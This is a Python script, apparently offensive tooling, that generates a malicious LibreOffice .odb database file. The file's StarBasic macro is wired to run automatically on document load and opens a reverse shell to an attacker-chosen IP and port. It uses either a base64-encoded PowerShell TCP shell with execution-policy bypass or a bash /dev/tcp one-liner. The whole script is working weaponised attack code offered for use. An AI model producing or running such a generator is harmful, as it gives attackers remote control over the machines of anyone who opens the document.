#!/usr/bin/python3

import time
import os
import sys
import base64
import shutil

def Help():

	print ('LibreOffice .odb document malicious macro generator')
	print ('Usage python3 libreoffice-odb.py <linux/windows> <ip> <port>')
	sys.exit(1)

if len(sys.argv) < 4:

	Help()

ip = sys.argv[2]
port = sys.argv[3]

def Macro_Gen():

	temporary_path='tmp_libre_office/'
	os.mkdir(temporary_path)

	# Basic folder
	os.mkdir(temporary_path + 'Basic')

	basic_script_lc_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
	<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
	 <library:library library:name="Standard" library:link="false"/>
	</library:libraries>'''

	f = open(temporary_path + 'Basic/' + 'script-lc.xml', 'w')
	f.write(basic_script_lc_xml)
	f.close()

	os.mkdir(temporary_path + 'Basic/' + 'Standard')
	basic_module_one_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
	<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

	Sub Payday
	Shell(&quot;''' + payload + '''&quot;)
	End Sub
	</script:module>'''

	f = open(temporary_path + 'Basic/' + 'Standard/' + 'Module1.xml', 'w')
	f.write(basic_module_one_xml)
	f.close()

	basic_script_lb_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
	<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
	 <library:element library:name="Module1"/>
	</library:library>'''

	f = open(temporary_path + 'Basic/' + 'Standard/' + 'script-lb.xml', 'w')
	f.write(basic_script_lb_xml)
	f.close()

	## END of basic

	# Configurations2
	os.mkdir(temporary_path + 'Configurations2')
	# END configurtions2

	# Content.xml

	content_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-content xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" xmlns:chart="urn:oasis:names:tc:opendocument:xmlns:chart:1.0" xmlns:rpt="http://openoffice.org/2005/report" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:ooow="http://openoffice.org/2004/writer" xmlns:oooc="http://openoffice.org/2004/calc" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:tableooo="http://openoffice.org/2009/table" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" xmlns:drawooo="http://openoffice.org/2010/draw" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0" xmlns:field="urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0" xmlns:math="http://www.w3.org/1998/Math/MathML" xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:dom="http://www.w3.org/2001/xml-events" xmlns:xforms="http://www.w3.org/2002/xforms" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:formx="urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:grddl="http://www.w3.org/2003/g/data-view#" xmlns:css3t="http://www.w3.org/TR/css3-text/" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.3"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Payday?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts><office:font-face-decls/><office:automatic-styles/><office:body><office:database><db:data-source><db:connection-data><db:connection-resource xlink:href="sdbc:embedded:hsqldb" xlink:type="simple"/><db:login db:is-password-required="false"/></db:connection-data><db:driver-settings db:system-driver-settings="" db:base-dn="" db:parameter-name-substitution="false"/><db:application-connection-settings db:is-table-name-length-limited="false" db:append-table-alias-name="false" db:max-row-count="100"><db:table-filter><db:table-include-filter><db:table-filter-pattern>%</db:table-filter-pattern></db:table-include-filter></db:table-filter><db:data-source-settings><db:data-source-setting db:data-source-setting-is-list="false" db:data-source-setting-name="Type" db:data-source-setting-type="string"><db:data-source-setting-value>simple</db:data-source-setting-value></db:data-source-setting></db:data-source-settings></db:application-connection-settings></db:data-source></office:database></office:body></office:document-content>'''

	f = open(temporary_path + 'content.xml', 'w')
	f.write(content_xml)
	f.close()

	# END content.xml

	#
	os.mkdir(temporary_path + 'database')
	os.mkdir(temporary_path + 'forms')
	#

	# META-INF

	os.mkdir(temporary_path + 'META-INF')

	manifest_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3" xmlns:loext="urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0">
	 <manifest:file-entry manifest:full-path="/" manifest:version="1.3" manifest:media-type="application/vnd.oasis.opendocument.base"/>
	 <manifest:file-entry manifest:full-path="Configurations2/" manifest:media-type="application/vnd.sun.xml.ui.configuration"/>
	 <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
	 <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
	</manifest:manifest>'''

	f = open(temporary_path + 'META-INF/' + 'manifest.xml', 'w')
	f.write(manifest_xml)
	f.close()

        # END meta-inf
	# Mimetype

	mimetype='''application/vnd.oasis.opendocument.base'''

	f = open(temporary_path + 'mimetype', 'w')
	f.write(mimetype)
	f.close()

	# END mimetype

	os.mkdir(temporary_path + 'reports')

	# Settings.xml

	settings_xml='''<?xml version="1.0" encoding="UTF-8"?>
	<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:ooo="http://openoffice.org/2004/office" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:number="urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:svg="http://www.w3.org/2000/svg" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.3"/>'''

	f = open(temporary_path + 'settings.xml', 'w')
	f.write(settings_xml)
	f.close()

        # END settings.xml

	output_filename='file'
	dir_name='tmp_libre_office'
	shutil.make_archive(output_filename, 'zip', dir_name)
	os.rename('file.zip','file.odb')

	time.sleep(0.5)
	shutil.rmtree(temporary_path)
	print ("Done.")

if sys.argv[1] == 'windows':

	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "', " + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
	base64payload = bytes_encoded.decode()
	payload = 'cmd.exe /C &apos;powershell.exe -ExecutionPolicy Bypass -e ' + base64payload + '&apos;'
	print ("[\033[32m+\033[0m] Payload: windows reverse shell")
	print ("[\033[32m+\033[0m] Creating malicious Libre Office .odb file\n")
	Macro_Gen()

if sys.argv[1] == 'linux':

	payload = '/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/' + ip + '/' + port + ' 0&gt;&amp;1&apos;'
	print ("[\033[32m+\033[0m] Payload: linux reverse shell")
	print ("[\033[32m+\033[0m] Creating malicious Libre Office .odb file\n")
	Macro_Gen()
